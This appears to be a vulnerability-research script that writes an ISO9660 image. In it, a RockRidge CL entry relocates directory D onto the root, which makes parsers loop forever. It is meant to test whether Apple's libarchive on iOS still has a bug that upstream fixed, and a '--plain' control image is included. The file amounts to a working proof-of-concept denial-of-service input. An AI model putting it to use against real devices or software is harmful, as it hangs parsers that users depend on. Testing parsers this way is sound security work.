#!/usr/bin/env python3
"""Build a minimal ISO9660 image carrying a RockRidge CL relocation cycle.

The claim under test (arc.rr, "RockRidge 重定位环"): upstream libarchive fixed an
infinite loop caused by a CL entry that relocates a directory onto an ancestor;
Apple has not taken that commit, so it should still loop on iOS.

Shape: the root directory contains `D`, whose SUSP area carries `CL` pointing back at the
root extent. Descending into D therefore re-enters the root, which yields D again.

Validated locally against bsdtar/libarchive before being ported to Swift.
Usage: python scripts/gen_rr_cycle.py out.iso [--plain]
"""
import struct
import sys

SECTOR = 2048
LBA_PVD = 16
LBA_TERM = 17
LBA_PT_L = 18
LBA_PT_M = 19
LBA_ROOT = 20
LBA_D = 21
TOTAL = 32   # libarchive's ISO bid reads 32k + 8 sectors; a smaller image is rejected as empty


def le16(v):
    return struct.pack("<H", v)


def be16(v):
    return struct.pack(">H", v)


def le32(v):
    return struct.pack("<I", v)


def be32(v):
    return struct.pack(">I", v)


def both16(v):
    return le16(v) + be16(v)


def both32(v):
    return le32(v) + be32(v)


def iso_date(y=2026, mo=10, d=29, h=12, mi=0, s=0):
    return bytes([y - 1900, mo, d, h, mi, s, 0])


def susp(sig, ver, data):
    entry = sig + bytes([len(data) + 4, ver]) + data
    if len(entry) % 2:
        entry += b"\x00"
    return entry


def sp_entry():
    return b"SP" + bytes([7, 1]) + b"\xbe\xef\x00"


def rr_entry(root=False):
    return susp(b"RR", 1, bytes([0x01 if root else 0x00]))


def px_entry(mode=0o040555):
    owner = both32(mode) + both32(1) + both32(0) + both32(0) + both32(1)
    return susp(b"PX", 1, owner)


def nm_entry(name):
    return susp(b"NM", 1, bytes([0]) + name.encode("ascii"))


def cl_entry(extent):
    return susp(b"CL", 1, both32(extent))


def er_entry():
    ident = b"RRIP_1991A"
    desc = b"THE ROCK RIDGE INTERCHANGE PROTOCOL"
    src = b"http://www.lemis.com"
    data = bytes([len(ident), len(desc), len(src), 1]) + ident + desc + src
    return susp(b"ER", 1, data)


def dir_record(name, extent, size, flags, system_use=b""):
    """ECMA-119 9.1 directory record. `name` is raw bytes (b'\\x00' for '.', b'\\x01' for '..')."""
    pad = 1 if len(name) % 2 == 0 else 0
    head_len = 33 + len(name) + pad
    total = head_len + len(system_use)
    rec = bytearray(head_len)
    rec[0] = total
    rec[1] = 0
    rec[2:10] = both32(extent)
    rec[10:18] = both32(size)
    rec[18:25] = iso_date()
    rec[25] = flags
    rec[26] = 0
    rec[27] = 0
    rec[28:32] = both16(1)
    rec[32] = len(name)
    rec[33:33 + len(name)] = name
    return bytes(rec) + system_use


def pad_to(data, n=SECTOR):
    if len(data) < n:
        data += b"\x00" * (n - len(data))
    return data[:n]


def build(cycle=True):
    img = bytearray(TOTAL * SECTOR)

    def put(lba, data):
        img[lba * SECTOR:lba * SECTOR + len(data)] = data

    # ---- path tables (one entry each: root only)
    def path_table(big_endian):
        rec = bytes([1, 0]) + (be32(LBA_ROOT) if big_endian else le32(LBA_ROOT)) \
            + (be16(1) if big_endian else le16(1)) + b"\x00"
        if len(rec) % 2:
            rec += b"\x00"
        return rec

    pt_l = path_table(False)
    pt_m = path_table(True)
    put(LBA_PT_L, pt_l)
    put(LBA_PT_M, pt_m)

    # ---- root directory: '.', '..', D (with CL back to root when cycle=True)
    d_system_use = rr_entry() + nm_entry("D")
    d_flags = 0x02
    if cycle:
        d_system_use += cl_entry(LBA_ROOT)
    root = bytearray()
    root += dir_record(b"\x00", LBA_ROOT, SECTOR, 0x02, sp_entry() + rr_entry(True) + px_entry())
    root += dir_record(b"\x01", LBA_ROOT, SECTOR, 0x02, rr_entry())
    root += dir_record(b"D", LBA_D, SECTOR, d_flags, d_system_use)
    put(LBA_ROOT, pad_to(bytes(root)))

    # ---- D itself: '.', '..'
    d = bytearray()
    d += dir_record(b"\x00", LBA_D, SECTOR, 0x02, rr_entry() + px_entry())
    d += dir_record(b"\x01", LBA_ROOT, SECTOR, 0x02, rr_entry())
    put(LBA_D, pad_to(bytes(d)))

    # ---- PVD
    pvd = bytearray(SECTOR)
    pvd[0] = 1
    pvd[1:6] = b"CD001"
    pvd[6] = 1
    pvd[8:40] = b"CINDER27".ljust(32, b" ")
    pvd[40:72] = b"RR-CYCLE".ljust(32, b" ")
    pvd[80:88] = both32(TOTAL)
    pvd[120:124] = both16(1)
    pvd[124:128] = both16(1)
    pvd[128:132] = both16(SECTOR)
    pvd[132:140] = both32(len(pt_l))
    pvd[140:144] = le32(LBA_PT_L)
    pvd[148:152] = be32(LBA_PT_M)
    # ECMA-119 8.4.18: the root record inside the PVD is exactly 34 bytes and carries no
    # system use area. Putting SUSP here overruns into the volume-set identifier at 190.
    root_rec = dir_record(b"\x00", LBA_ROOT, SECTOR, 0x02)
    pvd[156:156 + len(root_rec)] = root_rec
    pvd[881] = 1
    put(LBA_PVD, bytes(pvd))

    term = bytearray(SECTOR)
    term[0] = 255
    term[1:6] = b"CD001"
    term[6] = 1
    put(LBA_TERM, bytes(term))

    return bytes(img)


if __name__ == "__main__":
    out = sys.argv[1] if len(sys.argv) > 1 else "rr_cycle.iso"
    plain = "--plain" in sys.argv
    data = build(cycle=not plain)
    open(out, "wb").write(data)
    print("wrote %s  %d bytes  cycle=%s" % (out, len(data), not plain))
